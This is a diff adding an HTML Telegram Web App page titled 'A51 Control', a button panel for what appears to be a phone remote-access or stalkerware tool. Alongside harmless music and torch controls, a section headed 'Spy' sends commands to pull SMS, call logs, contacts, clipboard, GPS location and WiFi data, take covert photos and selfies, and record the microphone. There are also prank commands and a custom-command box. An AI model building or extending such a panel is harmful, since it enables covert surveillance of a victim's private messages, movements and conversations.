@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>A51 Control</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: system-ui, -apple-system, sans-serif;
+    background: var(--tg-theme-bg-color, #17212b);
+    color: var(--tg-theme-text-color, #ffffff);
+    padding: 12px;
+    min-height: 100vh;
+  }
+  h2 { font-size: 13px; margin: 16px 0 8px; opacity: 0.6; font-weight: 500; letter-spacing: 1px; text-transform: uppercase; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+  button {
+    background: var(--tg-theme-button-color, #5288c1);
+    color: var(--tg-theme-button-text-color, #fff);
+    border: none;
+    border-radius: 10px;
+    padding: 14px 8px;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    transition: transform 0.1s, opacity 0.1s;
+  }
+  button:active { transform: scale(0.94); opacity: 0.85; }
+  button.danger { background: #e74c3c; }
+  button.success { background: #27ae60; }
+  button.warn { background: #e67e22; }
+  .icon { font-size: 22px; }
+  input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: 1px solid var(--tg-theme-hint-color, #3b4a5a);
+    background: var(--tg-theme-secondary-bg-color, #232e3c);
+    color: var(--tg-theme-text-color, #fff);
+    font-size: 15px;
+    margin-bottom: 8px;
+  }
+</style>
+</head>
+<body>
+
+<h2>🎵 Музыка</h2>
+<div class="grid">
+  <button onclick="send('/play track1.mp3')"><span class="icon">▶️</span>Play</button>
+  <button class="danger" onclick="send('/stop')"><span class="icon">⏹</span>Stop</button>
+  <button onclick="send('/list')"><span class="icon">📋</span>Список</button>
+  <button onclick="askVolume()"><span class="icon">🔊</span>Громкость</button>
+</div>
+
+<h2>🤖 Система</h2>
+<div class="grid3">
+  <button onclick="send('/torch on')"><span class="icon">🔦</span>Вкл</button>
+  <button onclick="send('/torch off')"><span class="icon">🌑</span>Выкл</button>
+  <button onclick="send('/vibrate 3')"><span class="icon">📳</span>Вибро</button>
+  <button onclick="send('/photo')"><span class="icon">📸</span>Фото</button>
+  <button onclick="send('/selfie')"><span class="icon">🤳</span>Селфи</button>
+  <button onclick="send('/battery')"><span class="icon">🔋</span>Батарея</button>
+  <button onclick="send('/location')"><span class="icon">📍</span>GPS</button>
+  <button onclick="send('/device')"><span class="icon">📱</span>Инфо</button>
+  <button onclick="send('/clip')"><span class="icon">📋</span>Буфер</button>
+</div>
+
+<h2>🕵️ Шпион</h2>
+<div class="grid3">
+  <button onclick="send('/sms')"><span class="icon">📩</span>SMS</button>
+  <button onclick="send('/calls')"><span class="icon">📞</span>Звонки</button>
+  <button onclick="send('/contacts')"><span class="icon">👥</span>Контакт</button>
+  <button onclick="send('/record 10')"><span class="icon">🎤</span>Запись</button>
+  <button onclick="send('/wifi')"><span class="icon">📶</span>WiFi</button>
+  <button onclick="send('/wifiscan')"><span class="icon">📡</span>Скан</button>
+</div>
+
+<h2>🎭 Пранк</h2>
+<div class="grid3">
+  <button class="warn" onclick="send('/prank')"><span class="icon">🎭</span>Prank</button>
+  <button class="warn" onclick="send('/ghost')"><span class="icon">👻</span>Ghost</button>
+  <button class="warn" onclick="send('/insane')"><span class="icon">🤪</span>Insane</button>
+</div>
+
+<h2>💬 Своя команда</h2>
+<input id="custom" placeholder="/say Привет" />
+<button class="success" onclick="sendCustom()"><span class="icon">📤</span>Отправить</button>
+
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  function send(command) {
+    tg.sendData(command);
+    if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+    tg.close();
+  }
+
+  function sendCustom() {
+    const val = document.getElementById('custom').value.trim();
+    if (val) send(val);
+  }
+
+  function askVolume() {
+    const val = prompt('Громкость (0-100):', '50');
+    if (val !== null && !isNaN(val)) send('/volume ' + val);
+  }
+</script>
+
+</body>
+</html>
